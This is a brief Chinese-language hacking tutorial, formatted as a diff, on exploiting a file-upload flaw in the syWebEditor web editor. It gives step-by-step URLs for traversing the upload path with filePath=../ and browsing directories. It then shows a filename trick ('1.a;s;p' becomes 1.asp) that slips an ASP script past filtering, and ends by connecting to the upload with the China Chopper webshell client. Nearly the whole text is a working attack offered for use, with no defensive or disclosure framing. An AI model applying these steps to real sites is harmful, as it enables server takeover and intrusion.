@@ -1,0 +1,13 @@
+ syWebEditor上传漏洞的又一利用1,网上流传的syWebEditor上传漏洞，但是还是利用解析漏洞配合才能奏效，但是大部分情况下，我们发现上传的1.asp;2.gif文件，变成了1.asp2.gif，其中“；”被过滤掉了 
+http://www.xxxx.com/syWebEditor/ ... to&fileType=gif|jpg|png|&filePathType=1&filePath=/PhotoFile/ProFile/
+
+我们可以这样做  
+修改上传路径： 
+http://www.xxxxx.com/syWebEditor ... =1&filePath=../
+
+主要是删除 obj=ProPhoto&fileType=& 这两个参数，比较碍事;修改filePath=参数还能够浏览目录，当然是在目录权限不严格的情况下； - 
+
+ 
+2，上传文件，把我们上传的文件命修改为 1.a;s;p就好了，上传成功，系统自动为我们修改成1.asp,而且也摆脱了那个解析漏洞的限制。
+ 
+http://www.xxxxx.com/syWebEditor/1.asp 菜刀连接完事方法
